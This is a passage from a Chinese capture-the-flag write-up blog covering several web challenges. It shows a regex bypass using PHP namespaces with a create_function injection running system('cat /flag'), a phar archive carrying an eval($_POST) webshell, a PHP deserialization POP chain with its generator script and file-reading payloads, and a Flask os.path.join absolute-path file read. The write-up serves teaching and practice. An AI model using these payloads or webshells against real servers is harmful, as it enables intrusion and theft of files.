class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看还得绕绕<code>preg_match</code>，但再仔细想想，其实不难绕过嘛</p><p>正则表达式使用<code>^</code>时，表示匹配以紧随其后的规则开头的字符串，这里也即<code>[a-z0-9_]*</code>，合起来就表示<code>匹配以小写字母、数字或下划线开头的字符串</code>。</p><p>此处的<code>$</code>如果单独使用，表示将匹配以<code>[a-z0-9_]*</code>结尾的字符串，这里将其与<code>^</code>结合使用，看似形成了两面包夹芝士<del>（震声）</del>，但实际情况是<strong>不仅没匹配到以规则开头的，也没匹配到以规则结尾的</strong>，太惨了。</p><p>借助<a href="https://regex101.com/">regular expressions</a>这个强大的正则匹配解析网站，我们得以用更细致的视角来一探究竟。</p><p>设置待匹配字符串为<code>234233</code>，正则为<code>/^233$/</code></p><p>第一步匹配<code>^</code>，找到了这串字符串的开头</p><p><img src="/images/BUU/20220403212835.png"></p><p>下一步匹配<code>2</code></p><p><img src="/images/BUU/20220403221341.png"></p><p>再下一步匹配<code>3</code>，同上。</p><p>之后正则引擎试图匹配到另一个<code>3</code>，待匹配字符为<code>4</code>，于是乎直接<strong>no match</strong>了。</p><p><img src="/images/BUU/20220403221603.png"></p><p>换句话说，在这种情况下，如果都已经能绕过正则以某个（些）字符开头的规则了，其实是不用关心字符串的其它部分如何的。</p><p>回到题目中来，既然绕过正则后我们能控制的是一个函数，那么在什么情况下函数前面有除了字母以外的符号呢？</p><p>这里利用了<a href="https://www.php.cn/blog/detail/34355.html">php命名空间</a></p><p>在命名空间的加持下，我们就能用<code>\function()</code>这样的形式调用根命名空间下的函数，来代替<code>function()</code>了。</p><p>根据给定的参数形式，想到构造<a href="https://www.cnblogs.com/-chenxs/p/11459374.html">create_function()注入</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？<span class="attribute">a</span>=\create_function&amp;b=&#125;system(<span class="string">&#x27;cat /flag&#x27;</span>);//</span><br></pre></td></tr></table></figure><blockquote><p>从PHP 7.2.0开始，create_function()被废弃</p></blockquote><p><img src="/images/BUU/20220403162416.png"></p><h1 id="bingdundun"><a href="#bingdundun" class="headerlink" title="bingdundun~"></a>bingdundun~</h1><p>文件上传，仔细找找包含点先</p><p><img src="/images/BUU/20220404170034.png"></p><p>进入upload界面发现url变为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">bingdundun</span>=upload</span><br></pre></td></tr></table></figure><p>这个upload就很灵性，让人联想到upload.php</p><p>改为index</p><p><img src="/images/BUU/20220404173539.png"></p><p>说明此处即为文件包含点了</p><p>短暂测试后初步判断待上传的文件严格要求存在后缀，且为图片或压缩包形式，因此是没法包含图片马的说（悲</p><p>只剩下压缩文件包含了，这里选择用phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;pharshell.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&#x27;&lt;?php highlight_file(__FILE__);eval($_POST[sh]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>生成pharshell.phar文件</p><p>由于上传限制将后缀改为.zip上传</p><p><img src="/images/BUU/20220404175010.png"></p><p>访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?bingdundun=phar:<span class="regexp">//</span><span class="number">72537854</span>d5bbe8b957a8ca7ad3edb53d.zip/shell</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220404175329.png"></p><p>成功执行代码，蚁剑开梭</p><p><img src="/images/BUU/20220404175835.png"></p><h1 id="babyserialize"><a href="#babyserialize" class="headerlink" title="babyserialize"></a>babyserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>链子如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">TianXiWei:</span>:__wakeup</span><br><span class="line"><span class="symbol">Ilovetxw:</span>:__<span class="keyword">call</span></span><br><span class="line"><span class="symbol">four:</span>:__<span class="keyword">set</span></span><br><span class="line"><span class="symbol">Ilovetxw:</span>:__toString</span><br><span class="line"><span class="symbol">NISA:</span>:__invoke</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span> = <span class="string">&quot;payload&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">array</span>(<span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;sixsixsix&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>;</span><br><span class="line"><span class="variable">$i1</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> four;</span><br><span class="line"><span class="variable">$i2</span> = <span class="keyword">new</span> <span class="title class_">ILovetxw</span>;</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> NISA;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;ext = <span class="variable">$i1</span>;</span><br><span class="line"><span class="variable">$i1</span>-&gt;huang = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;a = <span class="variable">$i2</span>;</span><br><span class="line"><span class="variable">$i2</span>-&gt;su = <span class="variable">$n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>));</span><br></pre></td></tr></table></figure><p>总算梭完了，结果最后还有一个check要处理，过滤了好多能用的函数的说</p><p>从信息收集入手，发现可用<code>echo sacndir()[]</code>的方式查看目录文件</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$txw4ever = <span class="string">&quot;echo scandir(&#x27;</span>/<span class="string">&#x27;)[0].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[1].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[2].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[3].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[4].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[5].&#x27;</span> <span class="string">&#x27;.scandir(&#x27;</span>/<span class="string">&#x27;)[6];&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220404132823.png"></p><p><code>system()</code>用不了了，但还可以用<code>copy()</code>将flag带出来</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$t</span>xw4ever = <span class="string">&quot;copy(&#x27;/fllllllaaag&#x27;, &#x27;./1.txt&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220404145149.png"></p><p><del>（这是当时我们自己的解法，后来查看官方wp发现是非预期233）</del></p><p>官方原本想考察的是php原生类文件读取的说</p><h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><p>开题，F12访问source拖下来源码，一个flask后端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这道题想要分享的知识是绝对路径拼接</p><blockquote><p>os.path.join(path, *paths) 函数用于将多个文件路径连接成一个组合的路径。第一个参数通常包含了基础路径，而之后的每个参数都被当做组件拼接到基础路径后。</p><p>然而，这个函数有一个少有人知的特性。如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将被视为绝对路径。下面的示例揭示了开发者可能遇到的这个陷阱。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">request</span>):</span><br><span class="line">  filename = request.POST[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">  file_path = os.path.join(<span class="string">&quot;var&quot;</span>, <span class="string">&quot;lib&quot;</span>, filename)</span><br><span class="line">  <span class="keyword">if</span> file_path.find(<span class="string">&quot;.&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Failed!&quot;</span>)</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(file_path) <span class="keyword">as</span> f:</span><br><span class="line">      <span class="keyword">return</span> HttpResponse(f.read(), content_type=<span class="string">&#x27;text/plain&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在第 3 行中，我们使用 os.path.join 函数将用户输入的文件名构造出目标路径。在第 4 行中，检查生成的路径是否包含”.“，防止出现路径遍历漏洞。</p><p>但是，如果攻击者传入的文件名参数为”/a/b/c.txt“，那么第 3 行得到的变量 file_path 会是一个绝对路径（/a/b/c.txt）。即 os.path.join 会忽略掉”var/lib“部分，攻击者可以不使用“.”字符就读取到任何文件。尽管 os.path.join 的文档中描述了这种行为，但这还是导致了许多漏洞（Cuckoo Sandbox Evasion， CVE-2020-35736）。</p></blockquote><p>利用此特性，我们仅用上传一张名字为<code>/flag</code>的正常图片</p><p><img src="/images/BUU/20220404185724.png"></p><p>服务器返回302，跟进重定向，就能拿到flag了。</p><p><img src="/images/BUU/20220404191538.png"></p><p>此阶段还不能完全看懂题目源码，毕竟从没有用过flask写后端，只能说尽快开始学习吧，不要再拖了</p><h1 id="easyssrf"><a 